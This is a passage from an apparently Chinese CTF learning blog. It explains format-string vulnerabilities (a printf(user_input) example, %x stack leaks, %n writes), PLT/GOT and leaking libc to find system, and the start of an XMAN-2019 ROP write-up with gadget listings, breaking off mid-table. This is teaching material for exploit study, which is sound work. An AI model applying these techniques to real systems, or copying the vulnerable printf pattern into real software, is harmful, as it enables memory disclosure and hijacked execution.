<td align="center"></td>
</tr>
</tbody></table>
<p>上面的代码不会有什么问题，但是如果将字符串的输入权交给用户就会有问题了。看下面的代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> a[<span class="number">100</span>];</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">"%s"</span>,a);</span><br><span class="line">  <span class="built_in">printf</span>(a);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果用户输入的字符串是”%x%x%x”，则会输出以下结果：<code>ffffcde8c2</code></p>
<p>我们来看一下这个时候的栈结构</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">───────────────────────────────────[ STACK ]────────────────────────────────────</span><br><span class="line">00:0000│ esp  0xffffcdcc —▸ 0x80484f7 (main+60) ◂— add    esp, 0x10</span><br><span class="line">01:0004│      0xffffcdd0 —▸ 0xffffcde8 ◂— '%x%x%x'</span><br><span class="line">... ↓</span><br><span class="line">03:000c│      0xffffcdd8 ◂— 0xc2</span><br><span class="line">04:0010│      0xffffcddc —▸ 0xf7e926bb (handle_intel+107) ◂— add    esp, 0x10</span><br><span class="line">05:0014│      0xffffcde0 —▸ 0xffffce0e —▸ 0xffff0000 ◂— 0x0</span><br><span class="line">06:0018│      0xffffcde4 —▸ 0xffffcf0c —▸ 0xffffd13d ◂— 0x505f434c ('LC_P')</span><br><span class="line">07:001c│ eax  0xffffcde8 ◂— '%x%x%x'</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th align="center">高地址</th>
<th align="center"></th>
</tr>
</thead>
<tbody><tr>
<td align="center">……</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">argv[2]</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">argv[2]</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">argv[1]</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">Format String</td>
<td align="center">‘%x%x%x’</td>
</tr>
<tr>
<td align="center">ESP（EIP）</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">低地址</td>
<td align="center"></td>
</tr>
</tbody></table>
<p>为什么会是<code>ffffcde8c2c2</code>这个奇怪的数字呢，其实这是内存中的数据。因为<code>%x</code>表示输出第 n+1 个参数16进制数据，三个<code>%x</code>则表示输出栈中除了ESP外前三个内存的数据，不难看出，此时栈中的第2个参数数据就是<code>Format String</code>本身，之后0xffffcdd4-0xffffcdd8的地址数据均为<code>0xc2</code>，则可之三个<code>%x</code>的对应关系</p>
<p>对于栈来说，第一个参数是返回地址，格式化字符串的第一个参数是栈的第二个参数</p>
<p>也就是对于格式化字符串来说，第一个参数就是格式化字符串本身</p>
<table>
<thead>
<tr>
<th align="center">%x（1）</th>
<th align="center">0xffffcdd0</th>
<th align="center">0xffffcde8</th>
</tr>
</thead>
<tbody><tr>
<td align="center">%x（2）</td>
<td align="center">0xffffcdd4</td>
<td align="center">0xc2</td>
</tr>
<tr>
<td align="center">%x（3）</td>
<td align="center">0xffffcdd8</td>
<td align="center">0xc2</td>
</tr>
</tbody></table>
<p>故合在一起输出即为<code>ffffcde8c2c2</code></p>
<p>也许代码编写者的本意只是单纯打印一段字符（如<code>“hello world”</code>），但如果这段字符串来源于外部用户可控的输入，则该用户完全可以在字符串中嵌入格式化字符（如<code>%s</code>）。那么，由于<code>printf</code>允许参数个数不固定，故<code>printf</code>会自动将这段字符当作<code>format</code>参数，而用其后内存中的数据匹配<code>format</code>参数</p>
<p>原罪也就是冯诺依曼机结构中的：<strong>程序存储，共享数据，顺序执行</strong></p>
<p>即<code>printf</code>函数并不知道参数个数，它的内部有个指针，用来索检格式化字符串。对于特定类型%，就去取相应参数的值，直到索检到格式化字符串结束。</p>
<p>所以尽管没有参数，上面的代码也会将format string 后面的内存当做参数以16进制输出。这样就会造成内存泄露。</p>
<h2 id="进阶"><a href="#进阶" class="headerlink" title="进阶"></a>进阶</h2><h3 id="基本的格式化字符串参数"><a href="#基本的格式化字符串参数" class="headerlink" title="基本的格式化字符串参数"></a>基本的格式化字符串参数</h3><p><strong>%c</strong>：输出字符，配上<strong>%n</strong>可用于向指定地址写数据。</p>
<p><strong>%d</strong>：输出十进制整数，配上<strong>%n</strong>可用于向指定地址写数据。</p>
<p><strong>%x</strong>：输出16进制数据，如<strong>%i$x</strong>表示要泄漏偏移<strong>i</strong>处4字节长的16进制数据，<strong>%i$lx</strong>表示要泄漏偏移i处8字节长的16进制数据，32bit和64bit环境下一样。</p>
<p><strong>%p</strong>：输出16进制数据，与<strong>%x</strong>基本一样，只是附加了前缀0x，在32bit下输出4字节，在64bit下输出8字节，可通过输出字节的长度来判断目标环境是32bit还是64bit。</p>
<p><strong>%s</strong>：输出的内容是字符串，即将偏移处指针指向的字符串输出，如<strong>%i$s</strong>表示输出偏移i处地址所指向的字符串，在32bit和64bit环境下一样，可用于读取<strong>GOT</strong>表等信息。</p>
<p><strong>%n</strong>：将%n之前printf已经打印的字符个数赋值给偏移处指针所指向的地址位置，如<strong>%100×10$n</strong>表示将0x64写入偏移10处保存的指针所指向的地址（4字节），而<strong>%$hn</strong>表示写入的地址空间为2字节，<strong>%$hhn</strong>表示写入的地址空间为1字节，<strong>%$lln</strong>表示写入的地址空间为8字节，在32bit和64bit环境下一样。有时，直接写4字节会导致程序崩溃或等候时间过长，可以通过<strong>%$hn</strong>或<strong>%$hhn</strong>来适时调整。</p>
<p><strong>%n</strong>是通过格式化字符串漏洞改变程序流程的关键方式，而其他格式化字符串参数可用于读取信息或配合%n写数据</p>
<h3 id="格式化字符串漏洞的利用手段"><a href="#格式化字符串漏洞的利用手段" class="headerlink" title="格式化字符串漏洞的利用手段"></a>格式化字符串漏洞的利用手段</h3><ul>
<li><p>使程序崩溃，因为 <strong>%s</strong> 对应的参数地址不合法的概率比较大</p>
</li>
<li><p>查看进程内容，根据 <strong>%d</strong>，<strong>%f</strong> 输出了栈上的内容</p>
</li>
<li><p>泄露栈内存</p>
<ul>
<li>获取某个变量的值</li>
<li>获取某个变量对应地址的内存</li>
</ul>
</li>
<li><p>泄露任意地址内存</p>
<ul>
<li>利用 GOT 表得到 <code>libc</code> 函数地址，进而获取<code>libc</code>，进而获取其它<code>libc</code> 函数地址</li>
<li>盲打，dump 整个程序，获取有用信息</li>
</ul>
</li>
</ul>

        
      
    </div>

    
    
    
      <footer class="post-footer">
          <div class="post-eof"></div>
        
      </footer>
  </div>
  
  
  
  </article>

    
       <article itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block home">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/08/09/╨┬╩╓╧≥í¬í¬╟│╠╕PLT║═GOT/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="ZERO-A-ONE">
      <meta itemprop="description" content="Resit much,Obey little">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZERO-A-ONE">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
            
            <a href="/2019/08/09/╨┬╩╓╧≥í¬í¬╟│╠╕PLT║═GOT/" class="post-title-link" itemprop="url">新手向——浅谈PLT和GOT</a>
          
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              
                
              

              <time title="Created: 2019-08-09 09:23:22" itemprop="dateCreated datePublished" datetime="2019-08-09T09:23:22-07:00">2019-08-09</time>
            </span>
          
            

            
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2019-08-10 00:23:36" itemprop="dateModified" datetime="2019-08-10T00:23:36-07:00">2019-08-10</time>
              </span>
            
          

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>在做ROP题目的时候，经常需要我们利用<strong>libc.so</strong> 动态链接库中的函数。我们一般常用的方法是采用 got 表泄露，即输出某个函数对应的 <strong>got</strong> 表项的内容。这其中我们经常碰到<strong>PLT</strong>表和<strong>GOT</strong>表这两个东西，许多资料写的很复杂，这里以一种不怎么严谨的语言，浅谈一下<strong>PLT</strong>和<strong>GOT</strong></p>
<p>首先我们一个非常简单的例子作为引子</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Hello World!"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>一个非常简单的C语言程序，我们直接通过<code>gdb</code>进行反编译处理，然后通过<code>disas main</code>查看<code>main</code>函数中的反编译代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ disas main</span><br><span class="line">Dump of assembler code <span class="keyword">for</span> function main:</span><br><span class="line">   <span class="number">0x000000000000064a</span> &lt;+<span class="number">0</span>&gt;:	push   rbp</span><br><span class="line">   <span class="number">0x000000000000064b</span> &lt;+<span class="number">1</span>&gt;:	mov    rbp,rsp</span><br><span class="line">   <span class="number">0x000000000000064e</span> &lt;+<span class="number">4</span>&gt;:	lea    rdi,[rip+<span class="number">0x9f</span>]        # <span class="number">0x6f4</span></span><br><span class="line">   <span class="number">0x0000000000000655</span> &lt;+<span class="number">11</span>&gt;:	mov    eax,<span class="number">0x0</span></span><br><span class="line">   <span class="number">0x000000000000065a</span> &lt;+<span class="number">16</span>&gt;:	call   <span class="number">0x520</span> &lt;<span class="built_in">printf</span>@plt&gt;</span><br><span class="line">   <span class="number">0x000000000000065f</span> &lt;+<span class="number">21</span>&gt;:	mov    eax,<span class="number">0x0</span></span><br><span class="line">   <span class="number">0x0000000000000664</span> &lt;+<span class="number">26</span>&gt;:	pop    rbp</span><br><span class="line">   <span class="number">0x0000000000000665</span> &lt;+<span class="number">27</span>&gt;:	ret</span><br></pre></td></tr></table></figure>

<p><code>0x000000000000065a &lt;+16&gt;:    call   0x520 &lt;printf@plt&gt;</code></p>
<p>不难看到出现了这样一行反汇编代码，这就是我们调用的<code>printf</code>函数，为什么后面加了个@plt呢？我们要先知道这个printf函数并不是我们在这个main函数里面的工程里面实现的，而是调用了<code>stdio.h</code>这个<code>standard input &amp; output（标准输入输出)）</code>库实现的，等于说对于<code>main</code>函数这是一个外部函数，所以后面是跟了一个<code>@plt</code>。那什么是<strong>PLT</strong>？我们先说说什么是<strong>GOT</strong></p>
<p><strong>GOT</strong>是一个存储外部库函数的表，可以用<strong>GOT</strong>表来间接引用全局变量、函数，也可以把<strong>GOT</strong>表的首地址作为一个基准，用相对于该基准的偏移量来引用静态变量、静态函数。意思是说，<strong>GOT</strong>是一个映射表，这里的内容是此段代码里面引用到的外部符号的地址映射，比如你用到了一个<code>printf</code>函数，就会和<strong>GOT</strong>表产生关系。那这又和<strong>PLT</strong>有什么关系呢</p>
<p>PLT表可以称为内部函数表，GOT表为全局函数表，这两个表是相对应的，为什么叫做相对应呢，PLT表中的数据就是GOT表中的一个地址，是一一对应的。所以PLT表中存储的数字到底是什么意思？</p>
<p><strong>其实就是以GOT表的首地址作为一个基准称为基值，PLT中的值即为所指向函数在内存中相对于基值的偏移量（offset）</strong></p>
<p>也就是说<code>printf@plt</code>的在内存中的真实地址是： <strong>GOT基值+PLT存储的偏移量</strong></p>
<p>我们在编写<strong>ROP</strong>链时，由于 <code>libc</code>的延迟绑定机制，我们需要泄漏已经执行过的函数的地址。所以我们一般会先调用<code>write</code>函数再去暴露<code>write</code>函数在<strong>GOT</strong>表中的地址，这样暴露的地址才是<code>write</code>函数在内存中的真实地址</p>
<p>如果我们使用pwntools一般是这样使用<strong>GOT</strong>和<strong>PLT</strong>地址的</p>
<ul>
<li><code>got[&#39;a_function&#39;]</code>找到 <code>a_function</code>的 <strong>GOT</strong></li>
<li><code>plt[&#39;a_function&#39;]</code>找到 <code>a_function</code>的 <strong>PLT</strong></li>
</ul>
<p>当我们获得<code>write</code>函数在内存中的真实地址时，如何得到<strong>GOT</strong>表的基值，进而得到我们想要的<code>system</code>函数之类的地址？我们要知道两个函数在<strong>GOT</strong>表中的相对地址是不变的，也就是两个函数的<strong>PTL</strong>地址的偏移量也是不会变的，我们只需要得到其中一个函数的真实地址，减掉两个函数偏移量就可以得到另外一个函数的真实地址</p>
<p>例如我们先得到write函数与基值的偏移量</p>
<p><code>off_set = libc.symbols[&#39;write&#39;] - libc.symbols[&#39;__libc_start_main&#39;]</code></p>
<p>然后当我们拿到<code>write</code>函数在<strong>GOT</strong>表中的真实地址时,就可以计算出基值的真实地址</p>
<p><code>libc_address = write_address - off_set</code></p>
<p>还有一种写法<code>libc.address = write_address - off_set</code>，这样就可以在找system函数的真实地址时就直接可以：<code>system_address = libc.symbols[&quot;system&quot;]</code></p>
<p>所谓GOT表和PTL表都是为了重定位而生的</p>
<p>链接阶段是将一个或多个中间文件(.o文件)通过链接器将它们链接成一个可执行文件，主要做的事情有</p>
<blockquote>
<p>对各个中间文件的同名section进行合并</p>
<p>对代码段，数据段等进行地址分配</p>
<p>进行链接时重定位</p>
</blockquote>
<p>两种情况：</p>
<p>如果是在其他中间文件中已经定义了的函数，链接阶段可以直接重定位到函数地址</p>
<p>如果是在动态库中定义了的函数，链接阶段无法直接重定位到函数地址，只能生成额外的小片段代码，也就是PLT表，然后重定位到该代码片段</p>
<h3 id="运行时重定位"><a href="#运行时重定位" class="headerlink" title="运行时重定位"></a>运行时重定位</h3><p>运行后加载动态库，把动态库中的相应函数地址填入GOT表，由于PLT表是跳转到GOT表的，这就构成了运行时重定位</p>
<h3 id="延迟重定位"><a href="#延迟重定位" class="headerlink" title="延迟重定位"></a>延迟重定位</h3><p>只有动态库函数在被调用时，才会进行地址解析和重定位工作，这时候动态库函数的地址才会被写入到GOT表项中</p>
<p>函数第一次被调用过程</p>
<p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E6%96%B0%E6%89%8B%E5%90%91%E2%80%94%E2%80%94%E6%B5%85%E8%B0%88PLT%E5%92%8CGOT/5970003-bcf9343191848103.png" alt="img"></p>
<p>第一步由函数调用跳入到PLT表中，然后第二步PLT表跳到GOT表中，可以看到第三步由GOT表回跳到PLT表中，这时候进行压栈，把代表函数的ID压栈，接着第四步跳转到公共的PLT表项中，第5步进入到GOT表中，然后_dl_runtime_resolve对动态函数进行地址解析和重定位，第七步把动态函数真实的地址写入到GOT表项中，然后执行函数并返回。</p>
<p>解释下dynamic段，link_map和_dl_runtime_resolve</p>
<p>dynamic段：提供动态链接的信息，例如动态链接中各个表的位置</p>
<p>link_map：已加载库的链表，由动态库函数的地址构成的链表</p>
<p>_dl_runtime_resolve：在第一次运行时进行地址解析和重定位工作</p>
<p>函数之后被调用过程</p>
<p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E6%96%B0%E6%89%8B%E5%90%91%E2%80%94%E2%80%94%E6%B5%85%E8%B0%88PLT%E5%92%8CGOT/5970003-9baedd55881a39dd.png" alt></p>
<p>可以看到，第一步还是由函数调用跳入到PLT表，但是第二步跳入到GOT表中时，由于这个时候该表项已经是动态函数的真实地址了，所以可以直接执行然后返回。</p>
<p>对于动态函数的调用，第一次要经过地址解析和回写到GOT表项中，第二次直接调用即可</p>

        
      
    </div>

    
    
    
      <footer class="post-footer">
          <div class="post-eof"></div>
        
      </footer>
  </div>
  
  
  
  </article>

    
       <article itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block home">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/08/09/XMAN-2019-╕ú╓▌-PWN-stackoverflowú¿╧┬ú⌐/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="ZERO-A-ONE">
      <meta itemprop="description" content="Resit much,Obey little">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZERO-A-ONE">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
            
            <a href="/2019/08/09/XMAN-2019-╕ú╓▌-PWN-stackoverflowú¿╧┬ú⌐/" class="post-title-link" itemprop="url">XMAN-2019-福州-PWN-stackoverflow（下）</a>
          
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              
                
              

              <time title="Created: 2019-08-09 09:22:40" itemprop="dateCreated datePublished" datetime="2019-08-09T09:22:40-07:00">2019-08-09</time>
            </span>
          
            

            
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2019-08-10 00:23:02" itemprop="dateModified" datetime="2019-08-10T00:23:02-07:00">2019-08-10</time>
              </span>
            
          

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>今天上午的讲的基础ROP十分有趣啊，从普通的栈溢出<code>simple_stackoverflow2</code>到ROP的<code>simple_stackoverflow2_nx</code>过渡十分自然，同样的代码，只因为开启了不同的防护手段，就有完全不同的攻击手法，就很有趣。</p>
<p>相关资料均可在GitHub上下载：<a href="https://github.com/suyucheng-lz/XMAN-2019-FZU" target="_blank" rel="noopener">https://github.com/suyucheng-lz/XMAN-2019-FZU</a></p>
<h2 id="simple-stackoverflow3"><a href="#simple-stackoverflow3" class="headerlink" title="simple_stackoverflow3"></a>simple_stackoverflow3</h2><p>这题没有源代码，我们直接看IDA Pro反汇编得出的代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+0h] [rbp-400h]</span></span><br><span class="line"></span><br><span class="line">  alarm(<span class="number">0xA</span>u);</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">"Welcome        \n"</span>, <span class="number">0x10</span>uLL);</span><br><span class="line">  fflush(_bss_start);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x400</span>uLL);</span><br><span class="line">  echo(&amp;buf, &amp;buf);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> __<span class="function">fastcall <span class="title">echo</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s2[<span class="number">16</span>]; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; *(_BYTE *)(i + a1); ++i )</span><br><span class="line">    s2[i] = *(_BYTE *)(i + a1);</span><br><span class="line">  s2[i] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(<span class="string">"HEHE"</span>, s2) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"flag&#123;Welcome&#125;"</span>, s2);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">" is not flag"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">"%s"</span>, s2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>检查一下开启的安全保护</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>

<p>可以发现这是一个64位程序，64位程序和我们之前一直做的32位程序在传参数方式上有很大的不同。</p>
<p><code>linux_64</code>与<code>linux_86</code>的区别主要有两点：首先是内存地址的范围由32位变成了64位。但是可以使用的内存地址不能大于<code>0x00007FFFFFFFFFFF</code>，否则会抛出异常。其次是函数参数的传递方式发生了改变，x86中参数都是保存在栈上,但在x64中的前六个参数依次保存在<code>RDI</code>, <code>RSI</code>, <code>RDX</code>, <code>RCX</code>, <code>R8</code>和 <code>R9</code>中，如果还有更多的参数的话才会保存在栈上。</p>
<p>也就是说我们需要指令将传入栈中的数据弹出栈传入寄存器中才能完成参数传递。所以我们需要寻找一些类似于<code>pop rdi; ret</code>的这种<code>gadget</code>。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">syc@ubuntu:~/git/XMAN-2019-FZU/日程科目题目/PWN/simple_stackoverlow3$ ROPgadget --binary simple_stackoverlow3 --only "pop|ret" </span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x000000000040089c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x000000000040089e : pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004008a0 : pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004008a2 : pop r15 ; ret</span><br><span class="line">0x000000000040089b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x000000000040089f : pop rbp ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400675 : pop rbp ; ret</span><br><span class="line">0x00000000004008a3 : pop rdi ; ret</span><br><span class="line">0x00000000004008a1 : pop rsi ; pop r15 ; ret</span><br><span class="line">0x000000000040089d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400589 : ret</span><br><span class="line">0x00000000004006a5 : ret 0xc148</span><br><span class="line">0x000000000040081a : ret 0xfffd</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 13</span><br></pre></td></tr></table></figure>

<p> 我们可以发现程序现有的<code>gadget</code>并不能很好的构建<code>ROP</code>链条。其实在x64下有一些万能的gadgets可以利用。一般来说，只要程序调用了libc.so，程序都会有<code>__libc_csu_init()</code>这个函数用来对libc进行初始化操作。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0000000000400880</span> loc_400880:                             ; CODE XREF: __libc_csu_init+<span class="number">54</span>↓j</span><br><span class="line">.text:<span class="number">0000000000400880</span>                 mov     rdx, r13</span><br><span class="line">.text:<span class="number">0000000000400883</span>                 mov     rsi, r14</span><br><span class="line">.text:<span class="number">0000000000400886</span>                 mov     edi, r15d</span><br><span class="line">.text:<span class="number">0000000000400889</span>                 call    qword ptr [r12+rbx*<span class="number">8</span>]</span><br><span class="line">.text:<span class="number">000000000040088</span>D                 add     rbx, <span class="number">1</span></span><br><span class="line">.text:<span class="number">0000000000400891</span>                 cmp     rbx, rbp</span><br><span class="line">.text:<span class="number">0000000000400894</span>                 jnz     <span class="keyword">short</span> loc_400880</span><br><span class="line">.text:<span class="number">0000000000400896</span></span><br><span class="line">.text:<span class="number">0000000000400896</span> loc_400896:                             ; CODE XREF: __libc_csu_init+<span class="number">36</span>↑j</span><br><span class="line">.text:<span class="number">0000000000400896</span>                 add     rsp, <span class="number">8</span></span><br><span class="line">.text:<span class="number">000000000040089</span>A                 pop     rbx</span><br><span class="line">.text:<span class="number">000000000040089B</span>                 pop     rbp</span><br><span class="line">.text:<span class="number">000000000040089</span>C                 pop     r12</span><br><span class="line">.text:<span class="number">000000000040089</span>E                 pop     r13</span><br><span class="line">.text:<span class="number">00000000004008</span>A0                 pop     r14</span><br><span class="line">.text:<span class="number">00000000004008</span>A2                 pop     r15</span><br><span class="line">.text:<span class="number">00000000004008</span>A4                 retn</span><br></pre></td></tr></table></figure>

<p>观察<code>0x000000000040089A</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.text:000000000040089A                 pop     rbx</span><br><span class="line">.text:000000000040089B                 pop     rbp</span><br><span class="line">.text:000000000040089C                 pop     r12</span><br><span class="line">.text:000000000040089E                 pop     r13</span><br><span class="line">.text:00000000004008A0                 pop     r14</span><br><span class="line">.text:00000000004008A2                 pop     r15</span><br><span class="line">.text:00000000004008A4                 retn</span><br></pre></td></tr></table></figure>

<p>我们可以利用栈溢出构造栈上数据来控制 <code>rbx</code>,<code>rbp</code>,<code>r12</code>,<code>r13</code>,<code>r14</code>,<code>r15</code> 寄存器的数据。</p>
<p>因为栈是从高地址到低地址生长，而计算机读取指令是从低地址到高地址如果我们的参数为</p>
<p><code>argv[1]</code>, <code>argv[2]</code>, <code>argv[3]</code>, <code>argv[4]</code>, <code>argv[5]</code>, <code>argv[6]</code></p>
<p>则他们在栈中的内存分布应该为</p>
<table>
<thead>
<tr>
<th align="center">High Adress</th>
</tr>
</thead>
<tbody><tr>
<td align="center">argv[6]</td>
</tr>
<tr>
<td align="center">argv[5]</td>
</tr>
<tr>
<td align="center">argv[4]</td>
</tr>
<tr>
<td align="center">argv[3]</td>
</tr>
<tr>
<td align="center">argv[2]</td>
</tr>
<tr>
<td align="center">argv[1]</td>
</tr>
<tr>
<td align="center">Low Adress</td>
</tr>
</tbody></table>
<p>则执行指令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pop     rbx</span><br><span class="line">pop     rbp</span><br><span class="line">pop     r12</span><br><span class="line">pop     r13</span><br><span class="line">pop     r14</span><br><span class="line">pop     r15</span><br><span class="line">retn</span><br></pre></td></tr></table></figure>

<p>完成时的对应关系应该为</p>
<table>
<thead>
<tr>
<th align="center">argv[6]</th>
<th align="center">R15</th>
</tr>
</thead>
<tbody><tr>
<td align="center">argv[5]</td>
<td align="center">R14</td>
</tr>
<tr>
<td align="center">argv[4]</td>
<td align="center">R13</td>
</tr>
<tr>
<td align="center">argv[3]</td>
<td align="center">R12</td>
</tr>
<tr>
<td align="center">argv[2]</td>
<td align="center">RBP</td>
</tr>
<tr>
